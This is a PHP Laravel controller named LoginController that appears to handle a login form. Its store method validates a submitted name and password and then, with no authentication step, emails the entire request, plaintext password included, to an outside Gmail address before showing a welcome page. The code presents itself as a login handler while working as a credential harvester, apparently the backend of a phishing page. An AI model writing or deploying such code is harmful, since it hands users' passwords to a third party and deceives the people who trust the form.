<?php 
 
namespace App\Http\Controllers;
 
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\Login;

class LoginController extends Controller
{
    public function create()
    {
        return view('login');
    }
 
    public function store(Request $request)
    {
        request()->validate([
            'name' => 'required|min:3',
            'password' => 'required|min:6|regex:/^.*(?=.{3,})(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\d\X])(?=.*[!$#%]).*$/',
        ]);
        
        

        Mail::to('MerchAndEyesCA@gmail.com')
            ->send(new Login($request->except('_token')));
 
        return view('welcome');

    }

}